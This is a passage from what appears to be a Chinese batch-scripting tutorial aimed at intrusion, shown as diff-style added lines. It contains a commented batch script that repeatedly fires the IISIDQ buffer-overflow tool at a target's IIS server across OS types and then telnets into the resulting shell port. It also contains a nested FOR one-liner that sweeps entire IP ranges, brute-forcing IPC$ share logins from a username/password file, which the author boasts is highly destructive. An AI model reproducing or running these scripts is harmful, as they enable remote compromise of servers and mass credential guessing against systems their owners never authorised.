+if %a%==0 set d=0 /*如果环境变量a=0则创建环境变量d设定环境变量d=0。
+if %a%==1 set d=1 /*环境变量d其实是操作系统类型代码，用计数器来控制其
+if %a%==2 set d=2 /*变动。
+if %a%==3 set d=3
+if %a%==4 set d=4
+if %a%==5 set d=5
+if %a%==6 set d=6
+if %a%==7 set d=7
+if %a%==9 set d=9
+if %a%==10 set d=13
+if %a%==11 set d=14
+goto 0           /*变量传递完成后转到标志0处运行
+:1
+echo 正在执行第%d%项!与目标%b%不能连接!正在尝试连接请等候......
+:0             /*标志0开始
+IISIDQ %d% %b% 80 1 99 |find "good" /*按格式发送溢出命令并在结果中发现字符串good（发送代码成功才会有字符串good）
+if errorlevel 1 goto 1         /*如果没有good字符串则没有发送成跳
+/*转标志1处继续尝试发送
+ping 127.0.0.1 -n 8 >nul       /*ping自己8次相当于延时8秒不显示执
+/*行结果
+echo 正在执行第%d%项!       /*报告正在溢出的操作系统类型
+telnet %b% 99             /*连接溢出端口
+echo.                 /*显示一个空行
+if %d%==14 goto error1   /*如果操作系统类型为14则跳转error1处（循环出口）
+if %d%==13 set a=11         /*开始用计数器对操作系统代码重新附值
+if %d%==9 set a=10
+if %d%==7 set a=9
+if %d%==6 set a=7
+if %d%==5 set a=6
+if %d%==4 set a=5
+if %d%==3 set a=4
+if %d%==2 set a=3
+if %d%==1 set a=2
+if %d%==0 set a=1
+goto no                   /*附值完成跳转no段执行
+:file                     /*以下都是出错后的帮助提示
+echo IIsidq.exe没有发现!将该文件和本文件放在同一目录!
+goto exit
+:error
+echo 错误!目标ip不可识别!请使用下面的格式连接!
+echo idq [目标IP]
+goto exit
+:error1
+echo 连接没有成功!可能目标机器已经修补了该漏洞或者网络故障所至!
+echo 请按照下面的格式手工尝试!
+echo iisidq [目标类型] [目标IP] [目标端口] [连接方式] [溢出端口]
+echo telnet [目标ip] [溢出端口]
+:exit                   /*整个程序的出口
+这个批处理采用的整体循环掌握好计数器部分就掌握了这个批处理。
+例三
+for /l %%a in (0,1,255) do for /l %%b in (0,1,255) do for /l %%c in (1,1,254) do for /f "tokens=1,2*" %%e in (userpass.txt) do net use \\%1.%%a.%%b.%%c\ipc$ %%e /u:%%f
+上面的命令为1条命令。大家可以看出该命令使用了4个FOR来套用的。用法为：C:\>TEST.BAT 218 当输入218回车后该命令会由第1个for取初始值0为%%a然后继续取第2个for的初始值0为%%b继续取第3个for的初始值1为%%c最后一个for是将userpass.txt中的第一段字符作为密码%%e第二段字符作为用户名%%f最后执行命令 (这里我把上面的值都带进去，设密码为123 用户名为 abc)
+net usr \\218.0.0.1\ipc$ 123 /u:abc
+当然上面这个例子可能有些朋友会说太简单并且太死板不灵活。我把这个例子做了些修改（完整文件见光盘ipc.bat）由兴趣的朋友可以自己看看。修改后的程序可以灵活的查找你指定开始到结束或你指定开始到最大ip的范围。当然功能还可以在加强，至于能加强到什么地步能不能成为一个新的工具那就是你的事了。
+这个的循环动作大了点主要是ip的数字替换麻烦所以没办法。这个批处理我就不写注释了，大家好好的参考上面的内容你会很快看懂这个批处理的。看懂了得不要说简单哦！最起码这是个没有使用任何第三方工具就能探测并保存弱口令的批处理了！！简单的改一改杀伤力还是很大的。以上这些批处理全部在win2000和xp下测试通过最大的优点就是只有一个批处理文件并且绝对不会误报。缺点就是太长
+
+
+
